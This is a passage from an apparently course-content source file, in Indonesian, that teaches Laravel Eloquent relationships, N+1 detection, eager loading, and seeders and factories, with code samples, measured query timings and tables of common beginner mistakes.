        'Kedua kolom terlihat hampir sama, dan itulah yang membuat N+1 begitu sulit dilihat. Pada kolom kiri, `$c->penulis` di dalam perulangan menjalankan satu query **setiap kali** — sesuai perilaku "query dijalankan saat properti diakses" tadi. Seratus catatan berarti seratus query tambahan, dan yang mahal bukan query-nya melainkan seratus perjalanan bolak-balik ke database, masing-masing beberapa milidetik.',
      ),
      p(
        "Kolom kanan menambahkan `with('penulis')`, dan jumlah query-nya menjadi **dua** — berapa pun jumlah barisnya. Yang dilakukan Laravel: setelah mengambil semua catatan, ia mengumpulkan seluruh `penulis_id`-nya lalu menjalankan satu query `WHERE id IN (...)` untuk mengambil semua penulis sekaligus, kemudian mencocokkannya kembali di memori. Karena itu jumlah query tetap dua entah barisnya sepuluh atau sepuluh ribu.",
      ),
      p(
        'Catatan "cepat dengan 5 data uji, runtuh dengan 5.000" adalah inti bahayanya. Tidak ada error, tidak ada peringatan, dan pengujian di laptop berisi beberapa baris terasa instan. Masalahnya muncul sebagai "aplikasinya makin lambat" berbulan-bulan kemudian, saat penyebab dan gejalanya sudah terlalu jauh terpisah untuk dihubungkan. Karena itu bagian berikutnya menyalakan deteksi otomatis — mengubahnya dari masalah performa menjadi error saat pengembangan.',
      ),
      callout(
        'danger',
        'Kenapa N+1 begitu berbahaya',
        'Ia tidak menimbulkan error, tidak terlihat saat membaca kode, dan tidak terasa di data pengembangan. Ia muncul sebagai "aplikasinya makin lambat" berbulan-bulan kemudian, saat data sudah banyak. Sebuah halaman yang menjalankan 300 query bisa memakan waktu belasan detik hanya karena perjalanan bolak-baliknya.',
      ),

      h2('Menyalakan deteksi otomatis'),
      code(
        'php',
        `
        // app/Providers/AppServiceProvider.php
        public function boot(): void
        {
            // Di luar produksi, N+1 langsung MELEMPAR error.
            Model::preventLazyLoading(! $this->app->isProduction());

            // Sekalian: melempar kalau ada field yang diisi tapi tidak fillable
            Model::preventSilentlyDiscardingAttributes(! $this->app->isProduction());
        }
        `,
      ),
      p(
        'Dua baris ini mengubah dua masalah senyap menjadi error yang berisik. `preventLazyLoading` membuat setiap akses relasi yang belum di-`with` **melempar pengecualian**, sehingga N+1 baru tertangkap di detik kamu menulisnya — bukan enam bulan kemudian sebagai keluhan performa. `preventSilentlyDiscardingAttributes` melempar ketika ada field yang dikirim tetapi tidak ada di `$fillable`; secara bawaan Laravel membuangnya diam-diam, dan itu menyembunyikan salah ketik nama kolom sekaligus percobaan mass assignment.',
      ),
      p(
        'Perhatikan keduanya dipagari `! $this->app->isProduction()`, sehingga menyala di pengembangan dan pengujian tetapi mati di produksi. Alasannya sederhana, yaitu kamu ingin masalahnya meledak di depan matamu tetapi tidak ingin satu N+1 yang terlewat menjatuhkan halaman pengguna sungguhan. Ini pola yang sama seperti mode strict di frontend, sebab aturan yang dijaga mesin bertahan sedangkan aturan yang dijaga ingatan akan terlewat pada endpoint kesepuluh.',
      ),
      callout(
        'tip',
        'Ini menerapkan pelajaran yang sama seperti di frontend',
        'Aturan yang dijaga mesin bertahan; aturan yang dijaga ingatan tidak. Dengan satu baris itu, setiap N+1 baru menjadi error saat pengembangan — bukan temuan performa enam bulan kemudian.',
      ),

      h2('Eager loading yang lebih rinci'),
      code(
        'php',
        `
        // Beberapa relasi sekaligus
        Catatan::with(['penulis', 'komentar', 'tag'])->get();

        // Bersarang
        Catatan::with('komentar.penulis')->get();

        // Hanya kolom tertentu — foreign key WAJIB ikut
        Catatan::with('penulis:id,name')->get();

        // Dengan syarat
        Catatan::with(['komentar' => fn ($q) => $q->latest()->limit(5)])->get();

        // Hanya jumlahnya, tanpa memuat datanya
        Catatan::withCount('komentar')->get();   // -> $catatan->komentar_count
        `,
      ),
      p(
        "Kelima bentuk ini menjawab kebutuhan yang sering memaksa orang kembali ke lazy loading. Titik pada `'komentar.penulis'` memuat relasi **bersarang**, yaitu komentar beserta penulis masing-masing, tetap dalam jumlah query yang tetap. Bentuk `'penulis:id,name'` memuat hanya kolom yang dibutuhkan sehingga berguna untuk tabel `users` yang lebar, tetapi perhatikan `id` **wajib** ikut. Tanpanya Laravel tidak punya cara mencocokkan hasilnya kembali ke induknya, dan relasinya menjadi `null` tanpa satu pun error.",
      ),
      p(
        'Dua bentuk terakhir yang paling sering menyelamatkan. Closure pada `[\'komentar\' => fn ($q) => ...]` memungkinkan eager loading **bersyarat** — muat lima komentar terbaru saja, bukan seluruh dua ribu komentar hanya untuk menampilkan cuplikan. Dan `withCount` mengambil **jumlahnya** lewat subquery tanpa memuat satu baris komentar pun, menghasilkan properti `komentar_count`. Untuk halaman daftar yang hanya menampilkan angka "42 komentar", ini bedanya antara satu query ringan dan memuat puluhan ribu baris ke memori.',
      ),
      callout(
        'warning',
        "Pada `with('relasi:kolom')`, jangan lupa foreign key-nya",
        "Menulis `with('penulis:name')` tanpa `id` membuat Laravel tidak bisa mencocokkan hasilnya kembali ke induknya — relasinya jadi `null` tanpa error apa pun. Selalu sertakan kolom kunci.",
      ),

      h2('Query lewat relasi'),
      code(
        'php',
        `
        // Catatan yang PUNYA komentar
        Catatan::has('komentar')->get();

        // Catatan dengan lebih dari 5 komentar
        Catatan::has('komentar', '>', 5)->get();

        // Catatan yang punya komentar dari pengguna tertentu
        Catatan::whereHas('komentar', fn ($q) => $q->where('penulis_id', 42))->get();

        // Catatan TANPA komentar
        Catatan::doesntHave('komentar')->get();
        `,
      ),
      p(
        "Keempatnya **menyaring baris induk berdasarkan relasinya**, bukan memuat relasi itu — jadi jangan tertukar dengan `with()` di bagian sebelumnya. `has('komentar')` hanya mengembalikan catatan yang punya setidaknya satu komentar, dan `has('komentar', '>', 5)` menambahkan syarat jumlahnya. Di balik layar keduanya menjadi subquery `EXISTS`, sehingga penyaringannya dikerjakan database dan bukan dengan memuat semua catatan lalu membuangnya di PHP.",
      ),
      p(
        '`whereHas` menambahkan syarat **di dalam** relasinya lewat closure: yang dicari adalah catatan yang punya komentar dari pengguna 42, dan komentarnya sendiri tidak ikut dimuat. Perhatikan pasangannya di baris terakhir — `doesntHave` adalah kebalikan dari `has`, dan ia yang menjawab pertanyaan seperti "artikel mana yang belum dikomentari" tanpa perlu `LEFT JOIN` beserta pemeriksaan `IS NULL` dari sub-bab 2.5.',
      ),
      h2('Studi kasus di project nyata'),
      p(
        'Relasi Eloquent menyembunyikan seluruh SQL di baliknya, dan itu membuat dua kelas kesalahan yang berbeda terlihat sama. Yang pertama soal performa, yang kedua soal kebenaran angka, dan yang kedua jauh lebih sulit ketahuan.',
      ),
      code(
        'php',
        `
        final class Pesanan extends Model
        {
            public function pelanggan(): BelongsTo { return $this->belongsTo(Pelanggan::class); }
            public function item(): HasMany { return $this->hasMany(ItemPesanan::class); }
            public function produk(): BelongsToMany
            {
                return $this->belongsToMany(Produk::class, 'item_pesanan')
                    ->withPivot(['jumlah', 'harga_satuan'])   // kolom tambahan di tabel pivot
                    ->withTimestamps();
            }
        }
        `,
        {
          caption:
            'withPivot itu yang membedakan tabel penghubung biasa dari yang membawa datanya sendiri.',
        },
      ),
      p(
        'Bagian `withPivot` menjawab pertanyaan yang menentukan bentuk tabelnya, yaitu apakah penghubungnya membawa data sendiri. Jumlah dan harga satuan adalah fakta tentang **pasangan** pesanan dan produk, bukan tentang salah satunya, jadi tempatnya memang di tabel penghubung.',
      ),
      p(
        'Yang tidak diurus Eloquent adalah menjaga pasangannya tidak berulang, dan itu keputusan di migrasi.',
      ),
      code(
        'text',
        `
        $table->primary(['pesanan_id', 'produk_id']);

        Tanpa baris itu, pasangan yang sama bisa masuk berkali-kali:

          INSERT INTO artikel_tag (artikel_id, tag_id) VALUES (1, 1);
            ERROR:  duplicate key value violates unique constraint "artikel_tag_pkey"
            DETAIL:  Key (artikel_id, tag_id)=(1, 1) already exists.
        `,
        { caption: 'Dijalankan sungguhan pada PostgreSQL 16.15 di bab database.' },
      ),
      p(
        'Akibat tanpa batasan itu bukan error melainkan angka yang berlipat. Satu tag yang tercatat dua kali membuat artikelnya muncul dua kali di daftar penyaringan, dan membuat setiap penghitungan yang melewati tabel itu menghasilkan angka yang terlalu besar.',
      ),

      h2('Saat error-nya muncul'),
      p(
        'Kegagalan relasi yang paling sering bukan error melainkan **angka yang salah**, dan bentuknya sudah diukur di bab database.',
      ),
      code(
        'text',
        `
        SELECT p.nama, count(*) AS pakai_bintang, count(o.id) AS pakai_kolom
        FROM pelanggan p LEFT JOIN pesanan o ON o.pelanggan_id = p.id
        GROUP BY p.id, p.nama;

              nama       | pakai_bintang | pakai_kolom
          ---------------+---------------+-------------
           Belum Pesan 1 |             1 |           0     <- belum pernah memesan
           Pengguna 1    |             1 |           1
        `,
        {
          caption:
            'Dijalankan sungguhan. count(*) melaporkan 1 pesanan untuk pelanggan yang punya nol.',
        },
      ),
      p(
        'Di Eloquent, bentuk yang menghasilkan kesalahan yang sama adalah menghitung dari koleksi yang sudah dimuat alih-alih memakai `withCount`, dan ia juga membawa biaya memuat seluruh barisnya.',
      ),
      code(
        'php',
        `
        // Memuat SELURUH pesanan setiap pelanggan hanya untuk menghitungnya.
        foreach (Pelanggan::all() as $p) { echo count($p->pesanan); }

        // Satu query, tanpa memuat barisnya, dan angkanya benar untuk yang nol.
        Pelanggan::withCount('pesanan')->get();   // -> $p->pesanan_count
        `,
      ),
      p(
        'Kegagalan kedua adalah penjumlahan yang berlipat ketika beberapa relasi digabung sekaligus, dan yang ini menghasilkan angka yang masih terlihat masuk akal.',
      ),
      code(
        'text',
        `
        Satu pesanan dengan 3 item, di-JOIN ke tabel pembayaran dengan 2 cicilan:

          3 x 2 = 6 baris hasil

        sum(item.harga) di atas hasil itu menghitung setiap harga DUA KALI.
        Totalnya persis dua kali lipat, dan tidak ada satu pun error.

        Yang benar: agregasikan tiap relasi di subquery TERPISAH, lalu gabungkan.
        Di Eloquent:  ->withSum('item as total_item', 'harga')
                      ->withSum('cicilan as total_bayar', 'jumlah')
        `,
      ),
      p(
        'Kegagalan ketiga menghasilkan error yang sangat khas dan sering membingungkan, yaitu relasi yang saling menunjuk lalu diubah menjadi JSON.',
      ),
      code(
        'text',
        `
        return Pesanan::with('pelanggan.pesanan')->get();

          Maximum function nesting level reached
          (atau: memori habis, tergantung setelan)

        Penyebabnya lingkaran: pesanan -> pelanggan -> pesanan -> pelanggan ...

        Bentuk yang sama pernah diukur di JavaScript pada bab Fondasi:
          TypeError: Converting circular structure to JSON
              --> starting at object with constructor 'Object'
              --- property 'diri' closes the circle
        `,
        { caption: 'Pesan JavaScript di atas dijalankan sungguhan dengan Node 26.5.0.' },
      ),
      p(
        'Perbaikannya bukan memutus relasinya melainkan **memutuskan apa yang keluar**, dan itu tepat pekerjaan API Resource. Selama bentuk responsnya ditentukan satu per satu, tidak ada relasi yang bisa ikut tanpa diminta.',
      ),
      p(
        'Terakhir, relasi ke diri sendiri seperti komentar bersarang punya dua bahaya yang harus ditangani sadar.',
      ),
      code(
        'text',
        `
        BAHAYA 1 — penghapusan yang menjalar tanpa terlihat

          DELETE FROM komentar WHERE id = 1;

          Satu perintah itu menghapus balasannya DAN balasan atas balasannya,
          sebab CASCADE menjalar mengikuti pohonnya. Jumlah baris yang
          dilaporkan hanya menghitung yang disebut langsung.

        BAHAYA 2 — lingkaran

          UPDATE komentar SET induk_id = 3 WHERE id = 1;

          Komentar 1 menjadi anak dari cucunya sendiri. Foreign key TIDAK
          mencegah ini, sebab setiap barisnya tetap menunjuk baris yang ada.
          Penelusuran pohonnya akan berputar tanpa henti.
        `,
        { caption: 'Keduanya diuji sungguhan pada PostgreSQL 16.15 di bab database.' },
      ),

      h2('Kesalahan umum pemula'),
      p(
        'Relasi adalah bagian yang paling mudah menghasilkan angka salah, sebab hasilnya tetap berupa angka yang wajar.',
      ),
      table(
        ['Yang sering dilakukan', 'Kenapa terasa benar', 'Yang sebenarnya terjadi'],
        [
          [
            'Menghitung dengan `count($model->relasi)`',
            'Paling langsung',
            'Seluruh barisnya dimuat hanya untuk satu angka. Pakai `withCount()`',
          ],
          [
            'Menjumlahkan setelah menggabungkan dua relasi',
            'Tinggal `sum`',
            'Baris berlipat membuat jumlahnya berlipat. Agregasikan tiap relasi terpisah',
          ],
          [
            'Lupa primary key gabungan di tabel pivot',
            'Kedua kolomnya sudah foreign key',
            'Diuji sungguhan, pasangan yang sama bisa masuk berkali-kali dan hitungannya berlipat',
          ],
          [
            'Mengembalikan model dengan relasi bertingkat sebagai JSON',
            'Datanya memang dibutuhkan',
            'Relasi yang saling menunjuk menghasilkan lingkaran. Tentukan bentuk responsnya lewat Resource',
          ],
          [
            'Memakai `cascadeOnDelete` pada relasi ke diri sendiri',
            'Balasannya memang ikut terhapus',
            'Penghapusannya menjalar ke seluruh kedalaman pohon tanpa konfirmasi apa pun',
          ],
          [
            'Mengandalkan foreign key untuk mencegah lingkaran',
            'Batasannya kan sudah ada',
            'Foreign key hanya memastikan yang ditunjuk ADA. Susunan melingkar tetap lolos',
          ],
        ],
      ),
      p(
        'Baris kedua pantas ditegaskan karena ia satu-satunya di tabel ini yang menghasilkan angka salah tanpa gejala apa pun. Laporan penjualan yang totalnya dua kali lipat masih terlihat seperti angka yang mungkin, dan biasanya baru ketahuan ketika ada yang menghitung ulang dengan tangan atau ketika angkanya dibandingkan dengan sumber lain. Cara termurah menghindarinya adalah tidak pernah menjumlahkan di atas hasil penggabungan beberapa relasi, melainkan menghitung tiap agregat di subquery-nya sendiri.',
      ),
      references(
        {
          label: 'Eloquent: Relationships',
          href: 'https://laravel.com/docs/12.x/eloquent-relationships',
          source: 'Laravel',
          note: 'Setiap jenis relasi beserta letak foreign key-nya masing-masing.',
        },
        {
          label: 'Eager Loading',
          href: 'https://laravel.com/docs/12.x/eloquent-relationships#eager-loading',
          source: 'Laravel',
          note: 'Obat N+1, termasuk eager loading bersarang dan bersyarat.',
        },
        {
          label: 'Preventing Lazy Loading',
          href: 'https://laravel.com/docs/12.x/eloquent-relationships#preventing-lazy-loading',
          source: 'Laravel',
          note: 'Setelan yang mengubah N+1 dari masalah tak terlihat jadi error saat pengembangan.',
        },
        {
          label: 'Querying Relationship Existence',
          href: 'https://laravel.com/docs/12.x/eloquent-relationships#querying-relationship-existence',
          source: 'Laravel',
          note: '`has`, `whereHas`, dan `doesntHave` beserta SQL yang dihasilkannya.',
        },
      ),
    ],
  ),

  written(
    'seeder-factory',
    'Seeder & Factory',
    15,
    'Membuat data uji yang realistis, cepat, dan bisa diulang.',
    [
      p(
        'Menguji dengan tiga baris data buatan tangan menyembunyikan sebagian besar masalah. Factory membuatmu bisa membuat ribuan baris realistis dalam satu perintah — dan di situlah N+1, index yang hilang, dan paginasi yang salah mulai terlihat.',
      ),

      terms(
        {
          term: 'factory',
          meaning:
            'Cetakan untuk membuat data uji yang **realistis**. Menguji dengan tiga baris buatan tangan menyembunyikan sebagian besar masalah; ribuan baris dari factory membuat N+1, index yang hilang, dan paginasi yang salah mulai terlihat.',
        },
        {
          term: 'seeder',
          meaning:
            'Skrip pengisi data awal. Bedanya dari factory: factory **membuat satu** objek dengan nilai acak, seeder **mengatur skenario** — berapa banyak, dengan relasi apa, dalam bentuk seperti apa.',
        },
        {
          term: 'fake()',
          meaning:
            'Pembuat data palsu yang masuk akal — nama orang, kalimat, alamat, email. Nilainya bukan sekadar mengisi kolom: data yang panjangnya bervariasi menemukan bug tata letak dan batas kolom yang tidak muncul pada `"test"`.',
        },
        {
          term: 'definition()',
          meaning:
            'Metode yang mengembalikan nilai default satu baris. Menyebut `User::factory()` di dalamnya berarti relasi ikut dibuat otomatis kalau tidak diberikan — satu baris yang menghemat banyak persiapan.',
        },
        {
          term: 'state',
          meaning:
            'Variasi bernama dari sebuah factory — `->diarsipkan()`, `->terbit()`. Ia membuat skenario uji terbaca sebagai kalimat: `Catatan::factory()->diarsipkan()->count(5)->create()`.',
        },
        {
          term: 'create() vs make()',
          meaning:
            '`create()` **menyimpan ke database**; `make()` hanya membuat objeknya di memori. Yang kedua berguna untuk unit test yang tidak perlu menyentuh database sama sekali.',
        },
        {
          term: 'db:seed',
          meaning:
            'Perintah artisan yang menjalankan seeder. Dipasangkan dengan `migrate:fresh --seed`, ia memberi kamu database bersih berisi data realistis dalam satu perintah — dan itu membuat pengujian bisa diulang.',
        },
        {
          term: 'data uji yang bisa diulang',
          meaning:
            'Sifat yang membedakan seeder dari data yang diketik manual. Siapa pun di tim bisa menghasilkan **keadaan yang sama** dengan satu perintah — jadi bug yang kamu temukan bisa direproduksi orang lain.',
        },
        {
          term: 'jangan pakai seeder di produksi',
          meaning:
            'Seeder untuk data **uji**. Data awal produksi yang sungguhan seperti daftar kategori, peran, dan pengaturan lebih tepat lewat migration, karena ia berversi dan hanya berjalan sekali.',
        },
      ),

      h2('Factory'),
      code(
        'php',
        `
        <?php

        declare(strict_types=1);

        namespace Database\\Factories;

        use Illuminate\\Database\\Eloquent\\Factories\\Factory;

        final class CatatanFactory extends Factory
        {
            public function definition(): array
            {
                return [
                    'judul' => fake()->sentence(6),
                    'isi' => fake()->paragraphs(3, true),
                    'diarsipkan' => false,
                    // Relasi: otomatis membuat User kalau tidak diberikan
                    'penulis_id' => User::factory(),
                ];
            }

            // State: variasi yang sering dipakai
            public function diarsipkan(): static
            {
                return $this->state(fn () => ['diarsipkan' => true]);
            }

            public function panjang(): static
            {
                return $this->state(fn () => ['isi' => fake()->paragraphs(50, true)]);
            }
        }
        `,
      ),
      p(
        'Method `definition()` menggambarkan **satu baris yang masuk akal**, dan `fake()` mengisinya dengan data acak yang bentuknya realistis — kalimat sungguhan, bukan `"test1"`, `"test2"`. Itu penting karena data uji yang seragam menyembunyikan masalah: judul yang selalu sepuluh karakter tidak akan pernah memperlihatkan tata letak yang rusak oleh judul panjang.',
      ),
      p(
        "Baris `'penulis_id' => User::factory()` adalah bagian yang paling menghemat waktu. Ia tidak berisi angka melainkan factory lain, dan artinya: kalau pemanggil tidak menyebutkan penulisnya, buatkan satu `User` baru sekalian. Dengan begitu `Catatan::factory()->create()` cukup satu baris dan tetap menghasilkan data yang memenuhi foreign key.",
      ),
      p(
        'Dua method di bawahnya adalah **state**, yaitu variasi bernama dari definisi dasarnya. Alih-alih menulis `create([\'diarsipkan\' => true])` berulang kali di banyak berkas tes, kamu menulis `->diarsipkan()` yang terbaca sebagai kalimat. Nilainya bukan sekadar ringkas, sebab ketika bentuk data "diarsipkan" nanti berubah, misalnya butuh mengisi `diarsipkan_pada` juga, perubahannya cukup di satu tempat ini.',
      ),

      h2('Memakainya'),
      code(
        'php',
        `
        Catatan::factory()->create();                     // satu
        Catatan::factory()->count(50)->create();          // lima puluh
        Catatan::factory()->diarsipkan()->count(10)->create();
        Catatan::factory()->create(['judul' => 'Judul tertentu']);

        // Tanpa menyentuh database — untuk unit test yang cepat
        $catatan = Catatan::factory()->make();

        // Dengan relasi
        User::factory()
            ->has(Catatan::factory()->count(5))
            ->create();
        `,
      ),
      p(
        "Perbedaan `create()` dan `make()` menentukan kecepatan tesmu. `create()` menyimpan barisnya ke database, `make()` hanya membangun objeknya di memori. Untuk unit test yang menguji logika sebuah method tanpa perlu menyimpan apa pun, `make()` jauh lebih cepat karena tidak ada perjalanan ke database sama sekali. Perhatikan pula `create(['judul' => '...'])` menimpa satu field saja — sisanya tetap diisi acak oleh `definition()`, sehingga tesmu hanya menyebutkan hal yang benar-benar ia pedulikan.",
      ),
      p(
        'Bentuk `->has(Catatan::factory()->count(5))` membuat pengguna **beserta** lima catatannya dalam satu pernyataan, dan `penulis_id`-nya disambungkan otomatis. Ini yang membuat tes N+1 atau tes paginasi bisa disiapkan dalam satu baris, alih-alih perulangan manual yang mengisi foreign key sendiri.',
      ),

      h2('Seeder'),
      code(
        'php',
        `
        final class DatabaseSeeder extends Seeder
        {
            public function run(): void
            {
                // Akun tetap untuk masuk saat pengembangan
                $admin = User::factory()->create([
                    'name' => 'Admin',
                    'email' => 'admin@contoh.test',
                ]);

                // Data dalam jumlah yang cukup untuk menemukan masalah performa
                User::factory()
                    ->count(20)
                    ->has(Catatan::factory()->count(30))
                    ->create();
            }
        }
        `,
      ),
      p(
        'Seeder menjawab pertanyaan "seperti apa isi database saat aku baru mulai bekerja". Blok pertama membuat akun dengan email **tetap** — sengaja tidak acak, supaya kamu bisa selalu masuk dengan kredensial yang sama setelah membangun ulang database. Perhatikan domainnya `.test`, bukan domain sungguhan: alamat itu tidak bisa dikirimi email nyata, jadi tidak ada risiko surat uji coba nyasar ke orang.',
      ),
      p(
        'Blok kedua yang menentukan kualitas pengembanganmu: 20 pengguna dengan 30 catatan masing-masing menghasilkan **600 catatan**. Jumlah itu sengaja dipilih besar, karena dengan lima baris uji semuanya terasa instan dan tidak ada masalah yang terlihat — N+1 tidak terasa, paginasi tidak pernah sampai halaman kedua, dan index yang hilang tidak berpengaruh. Data yang cukup banyak membuat masalah performa muncul di laptopmu, bukan di produksi.',
      ),
      code(
        'bash',
        `
        php artisan db:seed
        php artisan migrate:fresh --seed     # bangun ulang dari nol
        `,
      ),
      p(
        'Perhatikan `db:seed` **menambah** data ke database yang ada, sehingga menjalankannya dua kali akan membuat dua Admin dan yang kedua gagal kalau emailnya `unique`. Karena itu perintah kedua yang biasanya kamu pakai sehari-hari. `migrate:fresh --seed` menghapus seluruh tabel, membangunnya kembali dari migration, lalu mengisi data uji, sehingga satu perintah cukup untuk kembali ke keadaan bersih yang bisa diprediksi. Dan seperti disebut sebelumnya, ia menghapus **tanpa konfirmasi**, jadi ia perintah untuk laptop dan bukan untuk server.',
      ),
      callout(
        'danger',
        'Jangan pernah menaruh password sungguhan di seeder',
        'Seeder ikut di-commit. Password default seperti `password` boleh untuk lingkungan pengembangan, tapi seeder yang sama tidak boleh pernah dijalankan di produksi. Beri penjagaan eksplisit: `if (app()->isProduction()) { return; }`.',
      ),

      h2('Kenapa jumlah datanya penting'),
      table(
        ['Dengan 5 baris', 'Dengan 5.000 baris'],
        [
          ['N+1 tidak terasa', 'Halaman butuh belasan detik'],
          ['Index yang hilang tidak terlihat', 'Query melambat drastis'],
          ['Paginasi selalu satu halaman', 'Bug `OFFSET` muncul'],
          ['Urutan tampak stabil', 'Baris terduplikasi antar halaman kalau `ORDER BY` tidak unik'],
        ],
      ),
      p(
        'Bug pada baris terakhir itu khas: tanpa pemecah seri yang unik di `ORDER BY`, item yang sama bisa muncul di dua halaman berbeda sementara item lain tidak pernah muncul sama sekali.',
      ),

      h2('Factory di dalam tes'),
      code(
        'php',
        `
        it('hanya menampilkan catatan milik pengguna yang masuk', function () {
            $ana = User::factory()->create();
            $budi = User::factory()->create();

            Catatan::factory()->count(3)->create(['penulis_id' => $ana->id]);
            Catatan::factory()->count(5)->create(['penulis_id' => $budi->id]);

            $respons = $this->actingAs($ana)->getJson('/api/catatan');

            $respons->assertOk()->assertJsonCount(3, 'data');
        });
        `,
      ),
      p(
        'Tes seperti ini yang menangkap IDOR. Ia bukan menguji bahwa fitur berjalan — ia menguji bahwa data orang lain **tidak** ikut terbawa.',
      ),
      h2('Studi kasus di project nyata'),
      p(
        'Seeder dan factory sering dianggap alat bantu yang hanya berguna saat memulai project, dan justru pemakaian yang paling berharga muncul jauh sesudah itu, yaitu **mengisi basis data pengembangan dengan jumlah baris yang mendekati produksi**. Tanpa itu, hampir semua masalah performa tidak pernah terlihat.',
      ),
      code(
        'text',
        `
        Diukur pada PostgreSQL 16.15 di bab database, tabel 300.000 baris:

          SELECT * FROM pesanan WHERE pelanggan_id = 137456;

          TANPA index : Parallel Seq Scan, Rows Removed by Filter: 150000
                        Execution Time: 10,688 ms
          DENGAN index: Index Scan, Buffers: shared hit=7
                        Execution Time:  0,047 ms

        Pada 100 baris, KEDUANYA selesai dalam waktu yang tidak terasa.
        Itulah kenapa masalah ini selalu ditemukan di produksi.
        `,
        {
          caption:
            'Dijalankan sungguhan. Selisihnya sekitar 227 kali, dan ia TUMBUH seiring jumlah baris.',
        },
      ),
      p(
        'Karena itu seeder yang berguna bukan yang membuat tiga baris contoh melainkan yang bisa membuat ratusan ribu. Dan begitu jumlahnya sebesar itu, cara membuatnya sendiri menjadi penentu apakah ia selesai dalam hitungan detik atau hitungan jam.',
      ),
      code(
        'php',
        `
        // LAMBAT: satu INSERT per baris. Untuk 100.000 baris berarti
        // 100.000 perjalanan ke basis data.
        Pelanggan::factory()->count(100_000)->create();

        // CEPAT: satu INSERT untuk banyak baris sekaligus, dikerjakan berpotongan
        // supaya memorinya tidak habis.
        collect(range(1, 100))->each(function () {
            $baris = Pelanggan::factory()->count(1000)->make()->map(
                fn ($p) => $p->getAttributes() + ['created_at' => now(), 'updated_at' => now()],
            )->all();
            Pelanggan::insert($baris);   // satu pernyataan untuk 1000 baris
        });

        // Perhatikan: insert() MELEWATI event model dan timestamps otomatis,
        // jadi keduanya ditulis sendiri. Itu pertukaran yang disengaja.
        `,
        {
          caption:
            'Diukur di bab database: 1.000 query terpisah 53 ms vs 1 query 3 ms, di koneksi lokal.',
        },
      ),
      p(
        'Perlu ditegaskan bahwa `insert()` melewati banyak hal yang biasanya dikerjakan Eloquent, mulai dari `created_at` otomatis sampai event model dan observer. Untuk seeder itu justru diinginkan, sebab kamu memang tidak ingin seratus ribu surel pemberitahuan terkirim. Untuk kode aplikasi sungguhan, pelewatan itu sering menjadi bug.',
      ),
      p(
        'Nilai kedua dari factory adalah membuat **kasus yang tidak nyaman** bisa diuji, dan bagian ini yang paling sering tidak dipakai.',
      ),
      code(
        'php',
        `
        // Bukan sekadar data yang rapi, tapi data yang MEMBUAT tampilan rusak.
        final class PesananFactory extends Factory
        {
            public function definition(): array
            {
                return [
                    'pelanggan_id' => Pelanggan::factory(),
                    'status' => fake()->randomElement(['baru', 'dibayar', 'dikirim', 'batal']),
                    'total' => fake()->numberBetween(10_000, 5_000_000),
                ];
            }

            // State untuk kasus yang selalu lupa diuji:
            public function tanpaItem(): static
            { return $this->has(ItemPesanan::factory()->count(0), 'item'); }

            public function judulSangatPanjang(): static
            { return $this->state(['catatan' => str_repeat('nama-berkas-panjang-', 20)]); }

            public function nilaiEkstrem(): static
            { return $this->state(['total' => 9_999_999_999]); }
        }
        `,
        {
          caption:
            'Tiga state terakhir itu yang memunculkan bug tata letak dan pembulatan sebelum pengguna menemukannya.',
        },
      ),

      h2('Saat error-nya muncul'),
      p(
        'Seeder menghasilkan kegagalan yang khas, dan sebagian di antaranya justru muncul karena seeder-nya berhasil.',
      ),
      code(
        'text',
        `
        1. SQLSTATE[23505]: Unique violation

           Factory menghasilkan nilai yang sama dua kali pada kolom UNIQUE.
           fake()->email tidak menjamin keunikan; fake()->unique()->email
           menjamin, dan MELEMPAR bila kehabisan nilai yang mungkin:

             OverflowException: Maximum retries of 10000 reached without finding
             a unique value

           Untuk jumlah besar, pakai nilai berurutan: 'pengguna'.$i.'@contoh.id'

        2. SQLSTATE[23503]: Foreign key violation

           Urutan seeder-nya salah. Pesanan dibuat sebelum pelanggannya ada.
           Kode SQLSTATE-nya diverifikasi sungguhan di bab database.

        3. Memory exhausted

           factory()->count(100000)->create() menyimpan seluruh model di memori
           sebagai objek. Kerjakan berpotongan.

        4. Seeder berjalan LAMA sekali

           Bukan error, dan inilah yang paling sering. Satu INSERT per baris.
        `,
      ),
      p(
        'Kegagalan yang paling mahal justru tidak ada di daftar itu, sebab ia tidak terjadi di komputer sendiri melainkan di produksi.',
      ),
      code(
        'php',
        `
        // BERBAHAYA: dipanggil tanpa syarat di dalam seeder.
        DB::table('pengguna')->truncate();
        Pelanggan::truncate();

        // php artisan migrate:fresh --seed dijalankan di produksi
        // karena salah membaca nama environment, dan seluruh data hilang.

        // Penjaga yang murah dan menutupnya:
        public function run(): void
        {
            if (app()->isProduction()) {
                throw new RuntimeException('Seeder ini tidak boleh jalan di produksi');
            }
            // ...
        }
        `,
        { caption: 'Perintah migrate:fresh menghapus SELURUH tabel sebelum membangunnya kembali.' },
      ),
      p(
        'Penjaga itu terlihat berlebihan sampai hari ia menyelamatkan sesuatu. Yang membuat kecelakaan seperti ini mungkin bukan kecerobohan besar melainkan hal-hal kecil, yaitu terminal yang masih terhubung ke server lain, berkas `.env` yang tertukar, atau perintah yang disalin dari catatan. Pemeriksaan satu baris di dalam seeder tidak bergantung pada satu pun dari itu.',
      ),

      h2('Kesalahan umum pemula'),
      p(
        'Seeder dan factory sering ditulis sekali di awal lalu tidak pernah disentuh lagi, dan justru itu yang membuat nilainya hilang.',
      ),
      table(
        ['Yang sering dilakukan', 'Kenapa terasa benar', 'Yang sebenarnya terjadi'],
        [
          [
            'Membuat data contoh beberapa baris saja',
            'Cukup untuk melihat tampilannya',
            'Diukur, selisih index baru terlihat pada ratusan ribu baris. Masalah performa tidak pernah muncul',
          ],
          [
            'Memakai `factory()->count(100000)->create()`',
            'Itu cara membuat banyak',
            'Satu INSERT per baris dan seluruh model di memori. Kerjakan berpotongan dengan `insert()`',
          ],
          [
            'Memakai `fake()->email` untuk kolom unik',
            'Emailnya kan acak',
            'Tabrakan pasti terjadi pada jumlah besar. Pakai `unique()`, atau nilai berurutan',
          ],
          [
            'Hanya membuat data yang rapi',
            'Datanya realistis',
            'Judul panjang, relasi kosong, dan nilai ekstrem yang merusak tampilan tidak pernah teruji',
          ],
          [
            'Memanggil `truncate()` tanpa penjaga environment',
            'Kan cuma untuk pengembangan',
            'Satu perintah yang salah tempat menghapus data produksi. Tambahkan pemeriksaan `isProduction`',
          ],
          [
            'Membiarkan factory usang setelah skema berubah',
            'Tidak ada yang error',
            'Test yang memakainya jadi menguji bentuk data yang sudah tidak ada lagi di produksi',
          ],
        ],
      ),
      p(
